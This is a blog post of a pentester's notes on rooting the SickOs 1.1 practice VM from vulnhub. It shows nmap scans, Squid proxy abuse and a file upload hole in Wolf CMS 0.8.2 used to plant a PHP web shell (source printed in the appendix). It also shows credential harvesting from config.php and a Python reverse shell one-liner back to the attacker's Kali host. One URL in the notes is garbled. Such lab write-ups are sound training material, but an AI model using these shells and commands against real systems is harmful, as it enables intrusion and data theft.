---
author: Nishchal Kush
published: '2016-01-19T19:46:00+10:00'
slug: 2016-01-19-vulnhub-com-sickos1-1
tags:
- pentest
- vulnerability
- sickos
- penetration testing
- vulnhub
- sickos1.1
title: vulnhub.com sickos1.1
---
host: 192.168.56.1
    dhcp-server: 192.168.56.100
    kali: 192.168.56.101

    * log
      # 2015/12/26 19:00 -> 19:40 (40min)
      # 2015/12/26 22:10 -> 23:50 (1hr 40min)
      # 2015/12/27 18:20 -> 18:40 (20min)
      # total time = 2hr 40min)

    * discovery - target
      * nmap --min-parallelism=100 -sP -T5 192.168.56.0/24
      * found: 192.168.56.102

    * discovery - services
      * nmap --min-parallelism=100 -A -T5 -p1-65535 192.168.56.102
      * found: port 22/tcp ssh, 3128/tcp squid, 8080/tcp ??
      * !!exploit-db did not reveal much
      * tried: nc -n -v 192.168.56.102 3128
      * with GET /
        * found: invalid URL error
      * with GET http://127.0.0.1/
        * found: landing page with BLEHHH!!! and PHP/5.3.10-1ubuntu3.21
      * using proxy: export http_proxy="http://192.168.56.102:3128"
      * wget http://192.168.56.102/robots.txt
      * found http://192.168.56.102/wolfcms
      * !!decided to use iceweasel with proxy instead of command line
        * did not find generator metatag
        * downloaded wolfcms
          * found: README.md, requested http://192.168.56.102/wolfcms/README.md
          * found: version = 0.8.2
          * found: , requested http://192.168.56.102/wolfcms/wolf/plugins/file_manager/file_manager.css
          * found: http://192.168.56.102/wolfcms/wolf/plugins/ is also browseable
          * found: that file_manager plugin is installed
        * read 
          - https://www.wolfcms.org/download/security-patches.html
          - http://www.securityfocus.com/archive/1/521797
          - https://www.exploit-db.com/exploits/36818/
          - https://packetstormsecurity.com/files/133011/Wolf-CMS-0.8.2-Open-Redirect.html 
          - https://github.com/wolfcms/wolfcms/issues/619
        * vulnerabilities
          * file upload
          * open redirect
        * stupidly tried admin/admin
        * uploaded shell.php using file uploaded
        * http://192.168.56.102/wolfcms/public/shell.php?cmd=id
        * used shell.php 
          * found: config.php using curl http://192.168.56.ll.php -d cmd="cat ../config.php"
          * found: mysql db=wolf, username=root, password=john@123
        * used curl http://192.168.56.102/wolfcms/public/shell.php --data-urlencode "cmd=mysqldump -u root -pjohn@123 mysql"
          * found:
        * used shell.php to list directories
          * found: /var/www/connect.py
        * attempted python reverse shell
          * kali - nc -vvv -l -p 1234
          * sickos - curl http://192.168.56.102/wolfcms/public/shell.php --data-urlencode "cmd=/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.101\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
        * attempted to get tty, inside reverse shell
          * /usr/bin/python -c 'import pty; pty.spawn("/bin/sh")'
        * tried to use su - sickos, using the mysql password john@123, worked!!
        * sudo bash
        * ls -l /root
        * cat a0216ea4d51874464078c618298b1367.txt
        


    * appendix

    // shell.php
    -- start of shell.php --
    <?php
    if(isset($_REQUEST['cmd']))
    {
      $cmd = $_REQUEST['cmd'];
      system($cmd);
      echo "<pre>$cmd</pre>";
    }
    else
    {
      echo "<pre>usage: ?cmd=</pre>";
    }
    ?>
    -- end of shell.php --
